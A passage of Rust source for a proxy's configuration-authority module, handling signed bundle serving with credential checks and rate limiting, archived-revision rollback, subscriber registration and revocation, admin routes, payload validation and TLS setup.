    /// `to_revision`, naming what it does hold;
    /// [`RollbackError::Store`] when the archived file cannot be read
    /// back; and [`RollbackError::Publish`] when the archived payload no
    /// longer validates or cannot be signed or stored. Nothing about the
    /// served bundle changes unless the whole call succeeds.
    pub fn rollback_to(&self, to_revision: u64) -> Result<RollbackOutcome, RollbackError> {
        let (mode, config_yaml, replaced_revision) = {
            let store = self.lock_store();
            let replaced_revision = store.current_revision();
            let archived = store.archived(to_revision).inspect_err(|_| {
                sbproxy_observe::metrics::record_config_authority_rollback("archived", "refused");
            })?;
            match archived {
                Some(archived) => (
                    archived.bundle.mode,
                    archived.bundle.config_yaml.clone(),
                    replaced_revision,
                ),
                None => {
                    sbproxy_observe::metrics::record_config_authority_rollback(
                        "archived", "refused",
                    );
                    return Err(RollbackError::NotArchived {
                        requested: to_revision,
                        available: render_revisions(store.archived_revisions()),
                    });
                }
            }
        };
        let outcome = self.publish(&config_yaml, mode).inspect_err(|_| {
            sbproxy_observe::metrics::record_config_authority_rollback("archived", "refused");
        })?;
        sbproxy_observe::metrics::record_config_authority_rollback("archived", "published");
        tracing::warn!(
            revision = outcome.revision,
            restored_from_revision = to_revision,
            replaced_revision,
            authority_id = %self.authority_id,
            "config authority rolled back to an archived revision: its payload is republished \
             under a new revision number",
        );
        Ok(RollbackOutcome {
            restored_from_revision: to_revision,
            replaced_revision,
            outcome,
        })
    }

    /// Revisions the archive ring holds, ascending.
    #[must_use]
    pub fn archived_revisions(&self) -> Vec<u64> {
        self.lock_store().archived_revisions().to_vec()
    }

    /// Answer one bundle fetch.
    ///
    /// Pure with respect to the served bundle: the only state this changes
    /// is the subscriber's last-seen revision.
    pub fn serve_bundle(&self, fetch: &BundleFetch<'_>) -> BundleReply {
        self.serve_bundle_at(fetch, now_unix_ms())
    }

    /// [`Self::serve_bundle`] at an explicit wall clock.
    pub fn serve_bundle_at(&self, fetch: &BundleFetch<'_>, now_unix_ms: u64) -> BundleReply {
        // Exactly one path on this listener. Everything else, including
        // every `/admin/*` route and `/metrics`, is not here.
        let path = fetch.path.split('?').next().unwrap_or(fetch.path);
        if path != BUNDLE_ENDPOINT_PATH {
            return BundleReply::plain(
                404,
                "not_found",
                r#"{"error":"not found","code":"not_found"}"#,
            );
        }
        if !fetch.method.eq_ignore_ascii_case("GET") {
            return BundleReply::plain(
                405,
                "method_not_allowed",
                r#"{"error":"method not allowed","code":"method_not_allowed"}"#,
            );
        }
        let Some(credential) = fetch.credential.filter(|token| !token.is_empty()) else {
            // Rate limited by peer even without a credential, so an
            // unauthenticated flood cannot bypass the limiter by never
            // presenting one.
            if !self.limiter.check(&format!("peer:{}", fetch.peer)) {
                return rate_limited();
            }
            return BundleReply::plain(
                401,
                "missing_credential",
                r#"{"error":"a subscriber bearer credential is required","code":"unauthorized"}"#,
            );
        };

        // Resolved to owned values inside their own block so the store
        // lock is released before anything else runs, and so no arm below
        // has to reason about a borrow of it still being live.
        let authenticated = {
            let store = self.lock_store();
            store.authenticate(credential).map(|record| {
                (
                    record.credential_id().to_string(),
                    record.subscriber_id().to_string(),
                )
            })
        };
        let (credential_id, subscriber_id) = match authenticated {
            Ok(identity) => identity,
            Err(error) => {
                // Rate limited by peer, so a flood of guesses cannot
                // bypass the limiter by never presenting a credential the
                // per-subscriber key could be derived from.
                if !self.limiter.check(&format!("peer:{}", fetch.peer)) {
                    return rate_limited();
                }
                return match error {
                    SubscriberAuthError::Invalid => BundleReply::plain(
                        401,
                        "invalid_credential",
                        r#"{"error":"subscriber credential is not recognized","code":"unauthorized"}"#,
                    ),
                    SubscriberAuthError::Revoked => BundleReply::plain(
                        403,
                        "revoked_credential",
                        r#"{"error":"subscriber credential has been revoked","code":"revoked"}"#,
                    ),
                };
            }
        };

        // The credential is the identity; the header is a claim about it.
        // A disagreement is refused rather than ignored, because the
        // last-seen revision this endpoint records is the fleet's rollout
        // evidence and attributing it to the wrong node makes that
        // evidence worse than none.
        if let Some(claimed) = fetch.subscriber_id.filter(|id| !id.is_empty()) {
            if claimed != subscriber_id {
                tracing::warn!(
                    claimed = %claimed,
                    registered = %subscriber_id,
                    credential_id = %credential_id,
                    "config authority refused a fetch whose subscriber-id header disagrees with \
                     its credential; re-register the subscriber under its new id, or fix the id \
                     in proxy.config_authority.upstream",
                );
                return BundleReply::plain(
                    403,
                    "subscriber_id_mismatch",
                    r#"{"error":"the x-sbproxy-subscriber-id header does not match the registered subscriber for this credential","code":"subscriber_id_mismatch"}"#,
                );
            }
        }

        // Per-subscriber from here on, keyed by credential rather than by
        // peer: a subscriber behind NAT with its siblings should not be
        // throttled for their traffic, and a subscriber that moves should
        // not get a fresh budget by changing address.
        if !self.limiter.check(&credential_id) {
            return rate_limited();
        }

        let Some(served) = self.served.load_full() else {
            return BundleReply::plain(
                404,
                "no_bundle_published",
                r#"{"error":"this authority has not published a configuration yet","code":"no_bundle"}"#,
            );
        };

        {
            let mut store = self.lock_store();
            // WOR-2464: what the node says it *applied*, recorded beside
            // what it was *served*. Under the same store lock and in the
            // same block, so a status page read between the two cannot
            // see a subscriber that fetched r42 and has no report at all.
            if let Some(report) = fetch.apply_report.clone() {
                let high_water = store.high_water_revision();
                if let Err(error) =
                    store.record_applied(&credential_id, report, high_water, now_unix_ms)
                {
                    // The subscriber is served either way. An over-claim
                    // is worth a warning because it is either a bug in a
                    // node or a node trying to poison the fleet view,
                    // and both are things an operator wants to see.
                    tracing::warn!(
                        error = %error,
                        credential_id = %credential_id,
                        subscriber_id = %subscriber_id,
                        "config authority discarded a subscriber's applied-revision report",
                    );
                }
            }
            if let Err(error) = store.record_seen(&credential_id, served.revision, now_unix_ms) {
                // The subscriber is being served either way; losing the
                // rollout evidence is worth an error line and nothing more.
                tracing::error!(
                    error = %error,
                    credential_id = %credential_id,
                    "config authority could not persist a subscriber's last-seen revision; the \
                     rollout view may under-report until the next change",
                );
            }
        }

        if if_none_match_matches(fetch.if_none_match, &served.etag) {
            return BundleReply {
                status: 304,
                etag: Some(served.etag.clone()),
                body: Arc::new(Vec::new()),
                reason: "not_modified",
                revision: Some(served.revision),
            };
        }
        BundleReply {
            status: 200,
            etag: Some(served.etag.clone()),
            body: Arc::clone(&served.body),
            reason: "ok",
            revision: Some(served.revision),
        }
    }

    /// Register a subscriber and mint its credential.
    ///
    /// The clear token is returned once and never stored, so the caller
    /// has to show it to the operator now or lose it.
    ///
    /// # Errors
    ///
    /// Returns an error when the identifier is unusable, when the registry
    /// is full, or when it cannot be persisted.
    pub fn register_subscriber(
        &self,
        subscriber_id: &str,
    ) -> Result<IssuedSubscriberCredential, AuthorityStoreError> {
        let mut credential_id = [0u8; CREDENTIAL_ID_BYTES];
        let mut secret = [0u8; CREDENTIAL_SECRET_BYTES];
        OsRng.fill_bytes(&mut credential_id);
        OsRng.fill_bytes(&mut secret);
        let seed = CredentialSeed::new(credential_id, secret);
        let issued = self
            .lock_store()
            .register_subscriber(subscriber_id, &seed, now_unix_ms())?;
        tracing::info!(
            subscriber_id = %subscriber_id,
            credential_id = %issued.record().credential_id(),
            "config authority registered a subscriber",
        );
        Ok(issued)
    }

    /// Revoke one credential. `false` means it was unknown or already
    /// revoked.
    ///
    /// # Errors
    ///
    /// Returns an error when the revocation cannot be persisted.
    pub fn revoke_credential(&self, credential_id: &str) -> Result<bool, AuthorityStoreError> {
        let revoked = self
            .lock_store()
            .revoke_credential(credential_id, now_unix_ms())?;
        if revoked {
            tracing::info!(
                credential_id = %credential_id,
                "config authority revoked a subscriber credential",
            );
        }
        Ok(revoked)
    }

    /// Revoke every live credential one subscriber holds.
    ///
    /// # Errors
    ///
    /// Returns an error when the revocations cannot be persisted.
    pub fn revoke_subscriber(&self, subscriber_id: &str) -> Result<usize, AuthorityStoreError> {
        let revoked = self
            .lock_store()
            .revoke_subscriber(subscriber_id, now_unix_ms())?;
        if revoked > 0 {
            tracing::info!(
                subscriber_id = %subscriber_id,
                revoked,
                "config authority revoked every credential held by a subscriber",
            );
        }
        Ok(revoked)
    }

    /// Operator-facing status: what is published, under which key, and
    /// which subscribers have taken it.
    #[must_use]
    pub fn status(&self) -> serde_json::Value {
        let served = self.served.load_full();
        let store = self.lock_store();
        let current_revision = store.current_revision();
        let now = now_unix_ms();
        let mut applied_current = 0usize;
        let mut apply_failed = 0usize;
        let mut apply_unknown = 0usize;
        let subscribers: Vec<serde_json::Value> = store
            .subscribers()
            .map(|record| {
                let applied = record.applied();
                match applied {
                    None => apply_unknown += 1,
                    Some(report) if report.status == sbproxy_config::ApplyStatus::Failed => {
                        apply_failed += 1;
                    }
                    Some(report) if current_revision > 0 && report.revision == current_revision => {
                        applied_current += 1;
                    }
                    Some(_) => {}
                }
                serde_json::json!({
                    "subscriber_id": record.subscriber_id(),
                    "credential_id": record.credential_id(),
                    "revoked": record.is_revoked(),
                    "revoked_at_unix_ms": record.revoked_at_unix_ms(),
                    "created_at_unix_ms": record.created_at_unix_ms(),
                    "last_seen_revision": record.last_seen_revision(),
                    "last_seen_at_unix_ms": record.last_seen_at_unix_ms(),
                    // The question an operator actually has during a
                    // rollout, answered rather than left as arithmetic.
                    "up_to_date": current_revision > 0
                        && record.last_seen_revision() == current_revision,
                    // WOR-2464: seen is not applied. Everything below is
                    // the node's own answer about what it is serving,
                    // and every field reads `unknown` rather than
                    // anything reassuring for a subscriber that has
                    // never reported one.
                    "apply_status": applied
                        .map_or("unknown", |report| report.status.as_str()),
                    "applied_revision": applied.map(|report| report.revision),
                    "applied_config_hash": applied
                        .map(|report| report.config_hash.clone()),
                    "apply_error": applied.and_then(|report| report.error.clone()),
                    "soak_verdict": applied.and_then(|report| report.soak_verdict.clone()),
                    "fallback_active": applied.map(|report| report.fallback_active),
                    "applied_up_to_date": applied.is_some_and(|report| {
                        current_revision > 0 && report.revision == current_revision
                    }),
                    // "Has not polled recently" and "polled and failed"
                    // are different problems with different first
                    // moves, and a page that showed only the second
                    // would call a disconnected node healthy for as
                    // long as its last report stayed true.
                    "poll_state": poll_state(record.last_seen_at_unix_ms(), now),
                })
            })
            .collect();
        serde_json::json!({
            "schema_version": ADMIN_SCHEMA_VERSION,
            "authority_id": self.authority_id,
            "key_id": self.signer.key_id(),
            "algorithm": self.signer.algorithm().as_str(),
            "verifying_material": self.signer.verifying_material_base64(),
            "verifying_keys_file": self.signer.verifying_key_file_json().ok(),
            "bundle_endpoint": BUNDLE_ENDPOINT_PATH,
            "current_revision": current_revision,
            "current_content_digest": served.as_ref().map(|served| served.content_digest.clone()),
            "current_issued_at_unix_ms": served.as_ref().map(|served| served.issued_at_unix_ms),
            "current_etag": served.as_ref().map(|served| served.etag.clone()),
            "previous_revision": store.previous().map(|signed| signed.bundle.revision),
            // WOR-2463: what `rollback --to-revision N` can name. An
            // operator planning a fleet rollback reads this before
            // choosing a target, so it is on the status page rather than
            // only in an error message they have to provoke first.
            "archived_revisions": store.archived_revisions(),
            "archive_keep": store.archive_keep(),
            "high_water_revision": store.high_water_revision(),
            "store_dir": store.directory().display().to_string(),
            "subscriber_count": store.subscriber_count(),
            "live_subscriber_count": store.live_subscriber_count(),
            // WOR-2464: the three numbers that turn a fleet rollback
            // into a decision. "31 of 34 applied r42, 3 failed" is what
            // an operator reads before deciding to roll back, and
            // computing it here rather than in every consumer means the
            // console, the CLI, and a script all say the same thing.
            "applied_current_count": applied_current,
            "apply_failed_count": apply_failed,
            "apply_unknown_count": apply_unknown,
            "subscribers": subscribers,
        })
    }

    /// Take the store lock, recovering from a poisoned mutex.
    ///
    /// A panic while the lock was held leaves durable state exactly as the
    /// last successful write left it, because every mutation persists
    /// before it is adopted in memory. Refusing to serve after an
    /// unrelated panic would take config distribution down for the whole
    /// fleet, which is strictly worse than carrying on from a consistent
    /// snapshot.
    fn lock_store(&self) -> std::sync::MutexGuard<'_, AuthorityStore> {
        self.store.lock().unwrap_or_else(|poisoned| {
            tracing::error!(
                "config authority store mutex was poisoned by an earlier panic; continuing from \
                 the last durably written state",
            );
            poisoned.into_inner()
        })
    }
}

/// Run the boot-equivalent validation an authority runs before it signs a
/// payload, without needing a loaded signing key or an open store to run it
/// with.
///
/// This is the function [`ConfigAuthority::validate_payload`] is made of, so
/// `sbproxy config authority publish` can refuse a payload locally, before a
/// revision is spent, using the same three steps in the same order the
/// server would. Two implementations of "what publishes" would drift, and
/// the drift would show up as a payload that passed the CLI and then burned
/// a revision on the authority.
///
/// `validation_dir` is the directory relative model-host paths in the
/// payload resolve against. See the module docs for why that axis of the
/// check is advisory and the rest is not.
///
/// Returns the `${VAR}` references that could not be resolved here. They are
/// a warning, not a refusal, so the caller decides where to report them: the
/// server logs them against its `authority_id`, and the CLI prints them
/// where the operator is looking.
///
/// # Errors
///
/// Returns [`PublishError`] naming the step that refused the payload.
pub fn validate_publish_payload(
    config_yaml: &str,
    validation_dir: &Path,
) -> Result<Vec<String>, PublishError> {
    if config_yaml.trim().is_empty() {
        return Err(PublishError::Invalid(
            "the payload is empty; publish the YAML fragment subscribers should apply".to_string(),
        ));
    }
    if config_yaml.len() > sbproxy_config::MAX_CONFIG_YAML_BYTES {
        return Err(PublishError::Invalid(format!(
            "the payload is {} bytes; the signed-bundle limit is {} bytes",
            config_yaml.len(),
            sbproxy_config::MAX_CONFIG_YAML_BYTES
        )));
    }
    // Screened with the subscriber's own detection, so a deny-listed path
    // cannot publish clean and then be refused by the whole fleet at once.
    let denied = sbproxy_config::denied_paths_in(config_yaml)
        .map_err(|error| PublishError::Compile(error.to_string()))?;
    if !denied.is_empty() {
        return Err(PublishError::DeniedPaths(denied));
    }
    // `denied_paths_in` above screens the PATHS a subscriber owns. It
    // cannot screen a VALUE, and two values reach past it: a secret
    // reference the subscriber's own resolver reads straight off that
    // node (`env:NAME`, `vault://env/NAME`, `file:PATH`), and a key
    // whose value is a host path the subscriber's compiler opens and
    // inlines. `proxy.secrets` is on the denied list precisely because a
    // node owns its own secret backends and filesystem; this applies the
    // same rule where the deny list could not reach, which is inside the
    // values (WOR-2433).
    //
    // Screened here, at publish, with the same function the subscriber
    // runs, so a payload cannot pass the authority and then be refused
    // by the whole fleet at once. `${VAR}` is deliberately still
    // allowed: naming per-node values in a fleet-wide document is the
    // documented pattern, and the unresolved-reference report below is
    // its existing gate.
    sbproxy_config::check_confined_document(
        "the published payload",
        config_yaml,
        &sbproxy_config::ConfinementPolicy::remote_document(),
    )
    .map_err(|error| PublishError::Confinement(error.to_string()))?;
    let compiled = sbproxy_config::compile_config(config_yaml)
        .map_err(|error| PublishError::Compile(format!("{error:#}")))?;
    // The deep checks live in the module constructors, not in
    // `compile_config`: a typo inside an opaque `policies:` entry is
    // invisible until something tries to build it. Deliberately the
    // validation constructor, which spawns no health-check probes to
    // outlive the pipeline it is thrown away with.
    let pipeline = crate::pipeline::CompiledPipeline::from_config_for_validation(compiled)
        .map_err(|error| PublishError::Construct(format!("{error:#}")))?;
    crate::model_runtime::validate_model_runtime(&pipeline, validation_dir)
        .map_err(|error| PublishError::ModelRuntime(format!("{error:#}")))?;
    drop(pipeline);
    Ok(sbproxy_config::unresolved_env_references(config_yaml))
}

/// The `429` every rate-limited path returns.
fn rate_limited() -> BundleReply {
    BundleReply::plain(
        429,
        "rate_limited",
        r#"{"error":"too many bundle requests; retry after the current minute","code":"rate_limited"}"#,
    )
}

/// Whether an `If-None-Match` header matches `etag`.
///
/// Accepts a comma-separated list, `*`, and the weak `W/` prefix, so an
/// ordinary HTTP client works against this endpoint and not only the
/// SBproxy subscriber.
fn if_none_match_matches(header: Option<&str>, etag: &str) -> bool {
    let Some(header) = header else {
        return false;
    };
    header.split(',').any(|candidate| {
        let candidate = candidate.trim();
        candidate == "*" || candidate.trim_start_matches("W/") == etag
    })
}

/// Stable display name for an apply mode.
fn format_mode(mode: BundleMode) -> &'static str {
    match mode {
        BundleMode::Overlay => "overlay",
        BundleMode::Replace => "replace",
    }
}

/// Host wall clock in unix milliseconds, saturating rather than panicking
/// on a clock set before the epoch.
fn now_unix_ms() -> u64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|elapsed| u64::try_from(elapsed.as_millis()).unwrap_or(u64::MAX))
        .unwrap_or(0)
}

// --- process handle ---------------------------------------------------

/// The authority this process publishes from, if it publishes at all.
///
/// A swap slot rather than a set-once cell so a test can install one, and
/// so a future reload path can replace one, without the process having to
/// restart to change its mind.
static PROCESS_AUTHORITY: ArcSwapOption<ConfigAuthority> = ArcSwapOption::const_empty();

/// Install the process-wide authority, replacing any previous one.
pub fn install_process_authority(authority: Arc<ConfigAuthority>) {
    PROCESS_AUTHORITY.store(Some(authority));
}

/// The process-wide authority, when this node publishes.
#[must_use]
pub fn current_authority() -> Option<Arc<ConfigAuthority>> {
    PROCESS_AUTHORITY.load_full()
}

/// Drop the process-wide authority. Used by tests that must not leak one
/// into the next case.
pub fn clear_process_authority() {
    PROCESS_AUTHORITY.store(None);
}

// --- admin surface ----------------------------------------------------

/// Dispatch `/admin/config-authority/*` routes.
///
/// Returns `None` for paths this module does not own, so the caller falls
/// through to the next dispatcher. Every route here runs behind the admin
/// server's operator-auth and RBAC gate; the bundle endpoint, which does
/// not, lives on its own listener instead.
pub fn dispatch(method: &str, path: &str, body: Option<&str>) -> Option<AdminResponse> {
    let query = path.split_once('?').map(|(_, query)| query);
    let path_only = path.split('?').next().unwrap_or(path);
    match path_only {
        PUBLISH_PATH => Some(dispatch_publish(method, query, body)),
        ROLLBACK_PATH => Some(dispatch_rollback(method, query, body)),
        STATUS_PATH => Some(dispatch_status(method)),
        SUBSCRIBERS_PATH => Some(dispatch_subscribers(method, body)),
        SUBSCRIBER_REVOKE_PATH => Some(dispatch_revoke(method, body)),
        _ => None,
    }
}

/// `POST /admin/config-authority/publish`: the request body is the YAML
/// payload, and `?mode=overlay|replace` selects how subscribers apply it.
fn dispatch_publish(method: &str, query: Option<&str>, body: Option<&str>) -> AdminResponse {
    if !method.eq_ignore_ascii_case("POST") {
        return method_not_allowed();
    }
    let Some(authority) = current_authority() else {
        return not_publishing();
    };
    let mode = match query_param(query, "mode").as_deref() {
        None | Some("overlay") => BundleMode::Overlay,
        Some("replace") => BundleMode::Replace,
        Some(other) => {
            return json(
                400,
                serde_json::json!({
                    "error": format!(
                        "mode {other:?} is not recognized; use `overlay` (merge over each \
                         subscriber's local document) or `replace` (become the whole document)"
                    ),
                    "code": "invalid_mode",
                }),
            )
        }
    };
    let Some(payload) = body.filter(|body| !body.trim().is_empty()) else {
        return json(
            400,
            serde_json::json!({
                "error": "the request body is the YAML payload to publish",
                "code": "invalid_payload",
            }),
        );
    };
    match authority.publish(payload, mode) {
        Ok(outcome) => json(
            200,
            serde_json::json!({
                "schema_version": ADMIN_SCHEMA_VERSION,
                "authority_id": authority.authority_id(),
                "key_id": authority.key_id(),
                "revision": outcome.revision,
                "content_digest": outcome.content_digest,
                "etag": outcome.etag,
                "mode": format_mode(outcome.mode),
                "issued_at_unix_ms": outcome.issued_at_unix_ms,
            }),
        ),
        Err(error) => {
            let status = if error.is_payload_fault() { 400 } else { 500 };
            if !error.is_payload_fault() {
                tracing::error!(error = %error, "config authority publication failed");
            }
            json(
                status,
                serde_json::json!({
                    "error": error.to_string(),
                    "code": error.code(),
                    // Whether the number is spent, computed from the
                    // variant rather than assumed. Every validation
                    // failure costs nothing. `Signing` and `Internal`
                    // are always past the reservation. The store is on
                    // both sides of it: `Reserve` is the reservation's
                    // own failure and costs nothing, `Store` is the
                    // commit's and does not, and both answer
                    // `store_failed` on the wire. That is the whole
                    // reason this is computed rather than keyed on the
                    // code.
                    "revision_consumed": error.consumed_revision(),
                }),
            )
        }
    }
}

/// `POST /admin/config-authority/rollback`: republish an earlier stored
/// revision's payload under a new revision number.
///
/// The body is optional. With none, or with `{}`, this is the one-step
/// rollback it has always been: the previous revision. With
/// `{"to_revision": N}` it republishes archived revision `N`, which is
/// what makes a fleet rollback to a revision from several publishes ago
/// possible (WOR-2463). A body that is present but not an object, or
/// whose `to_revision` is not a positive integer, is a `400` rather than
/// a silently ignored field: an operator who meant to name a revision
/// and got the one-step rollback instead would have rolled the fleet to
/// the wrong document.
fn dispatch_rollback(method: &str, query: Option<&str>, body: Option<&str>) -> AdminResponse {
    if !method.eq_ignore_ascii_case("POST") {
        return method_not_allowed();
    }
    let Some(authority) = current_authority() else {
        return not_publishing();
    };
    // The sibling route on this prefix takes `?mode=`, so
    // `?to_revision=39` is the spelling an operator reaches for. It was
    // silently discarded, and the one-step rollback ran with a `200`,
    // which is exactly the outcome the malformed-body `400` below
    // exists to prevent. Refused rather than honored: a query parameter
    // is not this route's contract, and guessing which one the caller
    // meant on a fleet-wide rollback is worse than saying so.
    if let Some(named) = query_param(query, "to_revision") {
        return json(
            400,
            serde_json::json!({
                "error": format!(
                    "to_revision is a JSON body field, not a query parameter; send \
                     {{\"to_revision\": {named}}} as the request body"
                ),
                "code": "invalid_to_revision",
                "revision_consumed": false,
            }),
        );
    }
    let to_revision = match parse_to_revision(body) {
        Ok(to_revision) => to_revision,
        Err(response) => return response,
    };
    let attempt = match to_revision {
        Some(revision) => authority.rollback_to(revision),
        None => authority.rollback(),
    };
    match attempt {
        Ok(rolled_back) => json(
            200,
            serde_json::json!({
                "schema_version": ADMIN_SCHEMA_VERSION,
                "authority_id": authority.authority_id(),
                "key_id": authority.key_id(),
                "revision": rolled_back.outcome.revision,
                "restored_from_revision": rolled_back.restored_from_revision,
                "replaced_revision": rolled_back.replaced_revision,
                "content_digest": rolled_back.outcome.content_digest,
                "etag": rolled_back.outcome.etag,
                "mode": format_mode(rolled_back.outcome.mode),
                "issued_at_unix_ms": rolled_back.outcome.issued_at_unix_ms,
            }),
        ),
        Err(error) => {
            let status = if error.is_request_fault() { 400 } else { 500 };
            if !error.is_request_fault() {
                tracing::error!(error = %error, "config authority rollback failed");
            }
            json(
                status,
                serde_json::json!({
                    "error": error.to_string(),
                    "code": error.code(),
                    // A rollback republishes, so it inherits the
                    // publish path's spend: a target the ring does not
                    // hold costs nothing, and a failure past the
                    // reservation has spent a number. `store_failed`
                    // is on both sides of that line, which is why this
                    // is computed rather than keyed on the code.
                    "revision_consumed": error.consumed_revision(),
                    // Machine-readable alongside the sentence, so a
                    // console can offer the choices rather than asking
                    // the operator to parse an error string.
                    "archived_revisions": authority.archived_revisions(),
                }),
            )
        }
    }
}

/// Read an optional `{"to_revision": N}` rollback body.
///
/// `Ok(None)` is "no target named", which is the one-step rollback.
fn parse_to_revision(body: Option<&str>) -> Result<Option<u64>, AdminResponse> {
    let Some(body) = body.map(str::trim).filter(|body| !body.is_empty()) else {
        return Ok(None);
    };
    let Ok(parsed) = serde_json::from_str::<serde_json::Value>(body) else {
        return Err(json(
            400,
            serde_json::json!({
                "error": "the rollback body must be JSON; send no body for the one-step \
                          rollback, or {\"to_revision\": N} to name an archived revision",
                "code": "invalid_body",
                "revision_consumed": false,
            }),
        ));
    };
    let Some(object) = parsed.as_object() else {
        return Err(json(
            400,
            serde_json::json!({
                "error": "the rollback body must be a JSON object",
                "code": "invalid_body",
                "revision_consumed": false,
            }),
        ));
    };
    match object.get("to_revision") {
        None | Some(serde_json::Value::Null) => Ok(None),
        Some(value) => match value.as_u64().filter(|revision| *revision > 0) {
            Some(revision) => Ok(Some(revision)),
            None => Err(json(
                400,
                serde_json::json!({
                    "error": "to_revision must be a positive integer naming an archived \
                              revision",
                    "code": "invalid_to_revision",
                    "revision_consumed": false,
                }),
            )),
        },
    }
}

/// Render a revision list for an error message.
fn render_revisions(revisions: &[u64]) -> String {
    if revisions.is_empty() {
        return "none (the archive is empty; publish at least once, or raise \
                proxy.config_authority.publish.archive_keep)"
            .to_string();
    }
    revisions
        .iter()
        .map(u64::to_string)
        .collect::<Vec<_>>()
        .join(", ")
}

/// `GET /admin/config-authority/status`.
fn dispatch_status(method: &str) -> AdminResponse {
    if !method.eq_ignore_ascii_case("GET") {
        return method_not_allowed();
    }
    match current_authority() {
        Some(authority) => json(200, authority.status()),
        None => not_publishing(),
    }
}

/// `GET /admin/config-authority/subscribers` lists, `POST` registers.
fn dispatch_subscribers(method: &str, body: Option<&str>) -> AdminResponse {
    let Some(authority) = current_authority() else {
        return not_publishing();
    };
    if method.eq_ignore_ascii_case("GET") {
        // The status document already carries the roster, so the list
        // route returns the same shape rather than a second one that can
        // drift from it.
        let status = authority.status();
        return json(
            200,
            serde_json::json!({
                "schema_version": ADMIN_SCHEMA_VERSION,
                "subscribers": status.get("subscribers").cloned().unwrap_or_default(),
                "subscriber_count": status.get("subscriber_count").cloned().unwrap_or_default(),
                "live_subscriber_count": status
                    .get("live_subscriber_count")
                    .cloned()
                    .unwrap_or_default(),
            }),
        );
    }
    if !method.eq_ignore_ascii_case("POST") {
        return method_not_allowed();
    }
    let Some(subscriber_id) = string_field(body, "subscriber_id") else {
        return json(
            400,
            serde_json::json!({
                "error": "a JSON body naming `subscriber_id` is required, matching the \
                          subscriber_id the node sets under proxy.config_authority.upstream",
                "code": "bad_request",
            }),
        );
    };
    match authority.register_subscriber(&subscriber_id) {
        Ok(issued) => {
            let credential_id = issued.record().credential_id().to_string();
            json(
                200,
                serde_json::json!({
                    "schema_version": ADMIN_SCHEMA_VERSION,
                    "subscriber_id": subscriber_id,
                    "credential_id": credential_id,
                    "credential": issued.into_token(),
                    "note": "shown once and never again; the authority keeps only a SHA-256 \
                             fingerprint. Give it to the subscriber as \
                             proxy.config_authority.upstream.credential, by secret reference \
                             rather than inline",
                }),
            )
        }
        Err(error) => store_failure("register subscriber", &error),
    }
}

/// `POST /admin/config-authority/subscribers/revoke`.
fn dispatch_revoke(method: &str, body: Option<&str>) -> AdminResponse {
    if !method.eq_ignore_ascii_case("POST") {
        return method_not_allowed();
    }
    let Some(authority) = current_authority() else {
        return not_publishing();
    };
    if let Some(credential_id) = string_field(body, "credential_id") {
        return match authority.revoke_credential(&credential_id) {
            Ok(revoked) => json(
                200,
                serde_json::json!({
                    "schema_version": ADMIN_SCHEMA_VERSION,
                    "credential_id": credential_id,
                    "revoked": revoked,
                }),
            ),
            Err(error) => store_failure("revoke credential", &error),
        };
    }
    if let Some(subscriber_id) = string_field(body, "subscriber_id") {
        return match authority.revoke_subscriber(&subscriber_id) {
            Ok(revoked) => json(
                200,
                serde_json::json!({
                    "schema_version": ADMIN_SCHEMA_VERSION,
                    "subscriber_id": subscriber_id,
                    "revoked": revoked,
                }),
            ),
            Err(error) => store_failure("revoke subscriber", &error),
        };
    }
    json(
        400,
        serde_json::json!({
            "error": "a JSON body naming either `credential_id` (one credential) or \
                      `subscriber_id` (every credential that node holds) is required",
            "code": "bad_request",
        }),
    )
}

/// One string field out of a JSON request body.
fn string_field(body: Option<&str>, field: &str) -> Option<String> {
    serde_json::from_str::<serde_json::Value>(body?)
        .ok()?
        .get(field)?
        .as_str()
        .map(str::to_string)
        .filter(|value| !value.trim().is_empty())
}

/// One query-string value.
fn query_param(query: Option<&str>, name: &str) -> Option<String> {
    query?
        .split('&')
        .filter_map(|pair| pair.split_once('='))
        .find(|(key, _)| *key == name)
        .map(|(_, value)| value.to_string())
}

fn json(status: u16, body: serde_json::Value) -> AdminResponse {
    (status, "application/json", body.to_string())
}

fn method_not_allowed() -> AdminResponse {
    json(
        405,
        serde_json::json!({"error": "method not allowed", "code": "method_not_allowed"}),
    )
}

fn not_publishing() -> AdminResponse {
    json(
        404,
        serde_json::json!({
            "error": "this node does not publish configuration bundles; set \
                      proxy.config_authority.publish to make it an authority",
            "code": "publish_not_configured",
        }),
    )
}

fn store_failure(operation: &str, error: &AuthorityStoreError) -> AdminResponse {
    // An operator handing over a malformed identifier is a 400; a store
    // that cannot be written is a 500. Conflating them would have someone
    // re-typing a correct id at a full disk.
    let status = if matches!(
        error,
        AuthorityStoreError::Invalid(_) | AuthorityStoreError::TooManySubscribers
    ) {
        400
    } else {
        tracing::error!(error = %error, operation, "config authority store operation failed");
        500
    };
    json(
        status,
        serde_json::json!({"error": error.to_string(), "code": "store_failed"}),
    )
}

// --- bundle listener --------------------------------------------------

/// Build the TLS acceptor for the bundle listener.
///
/// Any read or parse failure is an error rather than a fall back to
/// plaintext. An operator who configured TLS on a listener that carries a
/// fleet credential gets a listener that does not start, not one that
/// quietly serves the whole configuration in the clear.
fn build_acceptor(
    tls: &ConfigAuthorityPublishTlsConfig,
) -> anyhow::Result<tokio_rustls::TlsAcceptor> {
    use rustls::pki_types::{pem::PemObject, CertificateDer, PrivateKeyDer};

    let cert_pem = std::fs::read(&tls.cert_file).map_err(|error| {
        anyhow::anyhow!(
            "read config authority TLS certificate '{}': {error}",
            tls.cert_file
        )
    })?;
    let key_pem = std::fs::read(&tls.key_file).map_err(|error| {
        anyhow::anyhow!("read config authority TLS key '{}': {error}", tls.key_file)
    })?;
    let certs: Vec<CertificateDer<'static>> = CertificateDer::pem_slice_iter(&cert_pem)
        .collect::<Result<_, _>>()
        .map_err(|error| {
            anyhow::anyhow!(
                "parse config authority TLS certificate '{}': {error}",
                tls.cert_file
            )
        })?;
    if certs.is_empty() {
        anyhow::bail!(
            "config authority TLS certificate '{}' contained no CERTIFICATE blocks",
            tls.cert_file
        );
    }
    let key = PrivateKeyDer::from_pem_slice(&key_pem).map_err(|error| {
        anyhow::anyhow!("parse config authority TLS key '{}': {error}", tls.key_file)
    })?;
    // Build against an explicit provider rather than the process-level
    // default. `ServerConfig::builder()` panics when no default has been
    // installed, which makes this function depend on a binary having called
    // `install_default` first. The proxy binary does, but a test or an
    // embedder need not, and a panic deep in TLS setup is a poor way to
    // discover that. The mesh transport takes the same approach.
    let config = rustls::ServerConfig::builder_with_provider(Arc::new(
        rustls::crypto::ring::default_provider(),
    ))
    .with_safe_default_protocol_versions()
